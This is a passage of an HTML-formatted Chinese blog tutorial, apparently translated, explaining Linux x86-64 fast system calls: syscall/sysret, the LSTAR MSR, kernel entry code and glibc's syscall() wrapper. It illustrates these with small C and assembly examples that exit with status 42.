class=&quot;line&quot;&gt;        popq_cfi %rcx                           &lt;span class=&quot;comment&quot;&gt;/* User %esp */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        CFI_REGISTER rsp,rcx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        TRACE_IRQS_ON&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ENABLE_INTERRUPTS_SYSEXIT32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;ENABLE_INTERRUPTS_SYSEXIT32&lt;/code&gt;是定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L139-L143&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/asm/irqflags.h&lt;/code&gt;&lt;/a&gt;的宏，其中含有&lt;code&gt;sysexit&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;好了，你已经知道32位快速系统调用是如何工作的了。&lt;/p&gt;
&lt;h3 id=&quot;64位快速系统调用&quot;&gt;&lt;a href=&quot;#64位快速系统调用&quot; class=&quot;headerlink&quot; title=&quot;64位快速系统调用&quot;&gt;&lt;/a&gt;64位快速系统调用&lt;/h3&gt;&lt;p&gt;下一步之旅就是去探索64位快速系统调用了。其分别利用&lt;code&gt;syscall&lt;/code&gt; 、&lt;code&gt;sysret&lt;/code&gt;指令进入系统调用、从系统调用中返回。&lt;/p&gt;
&lt;h4 id=&quot;syscall-sysret&quot;&gt;&lt;a href=&quot;#syscall-sysret&quot; class=&quot;headerlink&quot; title=&quot;syscall/sysret&quot;&gt;&lt;/a&gt;syscall/sysret&lt;/h4&gt;&lt;p&gt;Intel指令集参考指南解释了&lt;code&gt;syscall&lt;/code&gt;指令是如何工作的:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR (after saving the address of the instruction following SYSCALL into RCX).
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;换句话说：为了让内核接收到系统调用，内核必须向&lt;code&gt;IA32_LSTAR&lt;/code&gt; MSR注册当系统调用触发时要执行的代码地址。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/cpu/common.c#L1128&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/cpu/common.c&lt;/code&gt;&lt;/a&gt; 可以找到相关代码:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;syscall_init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* ... other code ... */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        wrmsrl(MSR_LSTAR, system_call);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;MSR_LSTAR&lt;/code&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L9&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/uapi/asm/msr-index.h&lt;/code&gt;&lt;/a&gt;定义为 0xc0000082。&lt;/p&gt;
&lt;p&gt;类似传统软件中断型的系统调用, 使用&lt;code&gt;syscall&lt;/code&gt;触发系统调用时也定义了一些规范。&lt;/p&gt;
&lt;p&gt;用户程序需要将系统调用号写入&lt;code&gt;rax&lt;/code&gt;寄存器中。系统调用的参数要c传入通用寄存器中。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.x86-64.org/documentation/abi.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;x86-64 ABI &lt;/a&gt;章节A.2.1 对此有所描述:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.
2. A system-call is done via the syscall instruction. The kernel destroys registers %rcx and %r11.
3. The number of the syscall has to be passed in register %rax.
4. System-calls are limited to six arguments,no argument is passed directly on the stack.
5. Returning from the syscall, register %rax contains the result of the system-call. A value in the range between -4095 and -1 indicates an error, it is -errno.
6. Only values of class INTEGER or class MEMORY are passed to the kernel.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L569-L591&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;的注释中也有相关介绍。&lt;/p&gt;
&lt;p&gt;现在我们已经知道了如何执行系统调用以及如何传递这些参数，开始着手写一些内联汇编代码。&lt;/p&gt;
&lt;h4 id=&quot;自己写汇编使用syscall&quot;&gt;&lt;a href=&quot;#自己写汇编使用syscall&quot; class=&quot;headerlink&quot; title=&quot;自己写汇编使用syscall&quot;&gt;&lt;/a&gt;自己写汇编使用syscall&lt;/h4&gt;&lt;p&gt;基于前面介绍的例子，我们开始着手编写一小段含有内联汇编的C程序，代码中执行&lt;code&gt;exit&lt;/code&gt;系统调用并传递退出状态：42.&lt;/p&gt;
&lt;p&gt;首先，我们要找到&lt;code&gt;exit&lt;/code&gt;的系统调用号。在这个例子中，我们需要从&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl#L69&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_64.tbl&lt;/code&gt;&lt;/a&gt;中读取这张表：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;60 common exit sys_exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;exit&lt;/code&gt;的系统调用号是60. 根据前文介绍，我们只需将60写入&lt;code&gt;eax&lt;/code&gt;寄存器，以及第一个参数(退出状态)写入&lt;code&gt;rdi&lt;/code&gt;寄存器。&lt;/p&gt;
&lt;p&gt;请看下面这段含有内联汇编的C代码。类似前面的例子，从清晰度来看，冗余的文字可能比代码本身更重要。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;movq %0, %%rax\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;string&quot;&gt;&quot;movq %1, %%rdi\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;string&quot;&gt;&quot;syscall&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* output parameters, we aren&#39;t outputting anything, no none */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;/* (none) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* input parameters mapped to %0 and %1, repsectively */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (syscall_nr), &lt;span class=&quot;string&quot;&gt;&quot;m&quot;&lt;/span&gt; (exit_status)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    : &lt;span class=&quot;comment&quot;&gt;/* registers that we are &quot;clobbering&quot;, unneeded since we are calling exit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&quot;rax&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;rdi&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了! 我们利用&lt;code&gt;syscall&lt;/code&gt;系统调用方式来触发&lt;code&gt;exit&lt;/code&gt;系统调用。避免了软件中断，如果我们要用micro-benchmark 来计算时间的话，这种方法执行起来要快许多。&lt;/p&gt;
&lt;h4 id=&quot;内核层面：syscall入口&quot;&gt;&lt;a href=&quot;#内核层面：syscall入口&quot; class=&quot;headerlink&quot; title=&quot;内核层面：syscall入口&quot;&gt;&lt;/a&gt;内核层面：syscall入口&lt;/h4&gt;&lt;p&gt;现在我们已经知道了如何从用户程序中触发系统调用。接下来就要介绍内核如何利用系统调用号执行系统调用中的代码。&lt;/p&gt;
&lt;p&gt;回想前文，我们知道如何将&lt;code&gt;system_call&lt;/code&gt;函数的地址写入&lt;code&gt;LSTAR&lt;/code&gt; MSR中。&lt;/p&gt;
&lt;p&gt;下面就来看看这个函数中的代码是如何利用&lt;code&gt;rax&lt;/code&gt;寄存器将执行环境切换到系统调用中的。可以参考&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L629&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;call *sys_call_table(,%rax,8)  # XXX:    rip relative
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;类似传统系统调用，&lt;code&gt;sys_call_table&lt;/code&gt;一张在C文件中定义的表，其利用&lt;code&gt;#include&lt;/code&gt;将脚本产生的C代码包含进来。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/syscall_64.c#L25-L32&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/syscall_64.c&lt;/code&gt;&lt;/a&gt;,注意底部的&lt;code&gt;#include&lt;/code&gt;:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;asmlinkage &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;sys_call_ptr_t&lt;/span&gt; sys_call_table[__NR_syscall_max+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * Smells like a compiler bug -- it doesn&#39;t work&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         * when the &amp;amp; below is removed.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        [&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ... __NR_syscall_max] = &amp;amp;sys_ni_syscall,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;&lt;span class=&quot;keyword&quot;&gt;asm&lt;/span&gt;/syscalls_64.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从前文我们知道，系统调用表定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/syscalls/syscall_64.tbl&lt;/code&gt;&lt;/a&gt;。与传统中断模式一样，脚本在内核编译的时候执行并通过&lt;code&gt;syscall_64.tbl&lt;/code&gt;文件中的表生成&lt;code&gt;syscalls_64.h&lt;/code&gt;文件。&lt;/p&gt;
&lt;p&gt;上述代码包括能生成系统调用号索引的函数指针数组的C代码。&lt;/p&gt;
&lt;p&gt;以上就是如何通过&lt;code&gt;syscall&lt;/code&gt;系统调用进入内核的全过程。&lt;/p&gt;
&lt;h4 id=&quot;sysret-从syscall中返回&quot;&gt;&lt;a href=&quot;#sysret-从syscall中返回&quot; class=&quot;headerlink&quot; title=&quot;sysret: 从syscall中返回&quot;&gt;&lt;/a&gt;sysret: 从syscall中返回&lt;/h4&gt;&lt;p&gt;内核利用&lt;code&gt;sysret&lt;/code&gt;指令将执行环境恢复到用户程序执行&lt;code&gt;syscall&lt;/code&gt;的地方。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sysret&lt;/code&gt;比起&lt;code&gt;sysexit&lt;/code&gt;来要简单一些，因为当执行&lt;code&gt;syscall&lt;/code&gt;时，需要被恢复执行的地址保存在&lt;code&gt;rcx&lt;/code&gt;寄存器中。&lt;/p&gt;
&lt;p&gt;只要能将这个地址保存起来，并在执行&lt;code&gt;sysret&lt;/code&gt;前将其恢复到&lt;code&gt;rcx&lt;/code&gt;寄存器中，执行环境就能在触发&lt;code&gt;syscall&lt;/code&gt;的地方恢复。&lt;/p&gt;
&lt;p&gt;这种机制比较方便，因为&lt;code&gt;sysenter&lt;/code&gt;却要求你自己在代码中计算这个地址，并将其重写到寄存器中。&lt;/p&gt;
&lt;p&gt;上述代码在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L650-L655&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/kernel/entry_64.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movq RIP-ARGOFFSET(%rsp),%rcx
CFI_REGISTER    rip,rcx
RESTORE_ARGS 1,-ARG_SKIP,0
/*CFI_REGISTER  rflags,r11*/
movq    PER_CPU_VAR(old_rsp), %rsp
USERGS_SYSRET64
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中&lt;code&gt;USERGS_SYSRET64&lt;/code&gt;是定义在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L133-L135&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/include/asm/irqflags.h&lt;/code&gt;&lt;/a&gt;中的宏，其中包含&lt;code&gt;sysret&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;好了，目前为止，你已经知道64位系统调用是如何工作的了。&lt;/p&gt;
&lt;h2 id=&quot;syscall-2-半手动调用syscall&quot;&gt;&lt;a href=&quot;#syscall-2-半手动调用syscall&quot; class=&quot;headerlink&quot; title=&quot;syscall(2)半手动调用syscall&quot;&gt;&lt;/a&gt;syscall(2)半手动调用syscall&lt;/h2&gt;&lt;p&gt;太棒了，针对不同系统调用模型，我们已经知道如何编写汇编代码去触发这些系统调用了。&lt;/p&gt;
&lt;p&gt;通常来说，你没必要自己写汇编代码。glibc提供的封装器函数已经为你处理好了所有的汇编代码。&lt;/p&gt;
&lt;p&gt;当然，也有一些系统调用，glibc并没有为其做好封装器。其中一个例子就是&lt;code&gt;futex&lt;/code&gt;–快速用户层上锁系统调用。&lt;/p&gt;
&lt;p&gt;等等，为什么&lt;a href=&quot;http://man7.org/linux/man-pages/man7/futex.7.html#NOTES&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;futex&lt;/code&gt;&lt;/a&gt;没有系统调用封装器呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;futex&lt;/code&gt;是为库函数调用准备的，而不是应用程序。因此，要想调用&lt;code&gt;futex&lt;/code&gt;，你必须这样做:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;为你想支持的平台生成汇编存根(stub)&lt;/li&gt;
&lt;li&gt;使用glibc提供的&lt;code&gt;syscall&lt;/code&gt;封装器&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有些时候，如果你想执行那些没有封装器的系统调用，你别无选择，只能利用第二种方法：使用glibc提供的&lt;code&gt;syscall&lt;/code&gt;函数。&lt;/p&gt;
&lt;p&gt;我们试试利用glibc提供的&lt;code&gt;syscall&lt;/code&gt;调用&lt;code&gt;exit&lt;/code&gt;，其退出状态是42:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; syscall_nr = &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; exit_status = &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  syscall(syscall_nr, exit_status);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，编译，执行，然后检查退出状态:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -o test test.c
$ ./test
$ echo $?
42
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了！我们利用glibc提供的&lt;code&gt;syscall&lt;/code&gt;封装器成功的调用了&lt;code&gt;exit&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;glibc-syscall封装器内幕&quot;&gt;&lt;a href=&quot;#glibc-syscall封装器内幕&quot; class=&quot;headerlink&quot; title=&quot;glibc syscall封装器内幕&quot;&gt;&lt;/a&gt;glibc syscall封装器内幕&lt;/h3&gt;&lt;p&gt;来看看前面例子中&lt;code&gt;syscall&lt;/code&gt;封装器在glibc中是如何工作的&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/syscall.S#L24-L42&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;sysdeps/unix/sysv/linux/x86_64/syscall.S&lt;/code&gt;&lt;/a&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/* Usage: long syscall (syscall_number, arg1, arg2, arg3, arg4, arg5, arg6)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   We need to do some arg shifting, the syscall_number will be in&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   rax.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .text&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ENTRY (syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rdi, %rax         /* Syscall number -&amp;gt; rax.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rsi, %rdi         /* shift arg1 - arg5.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rdx, %rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %rcx, %rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %r8, %r10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq %r9, %r8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        movq 8(%rsp),%r9        /* arg6 is on the stack.  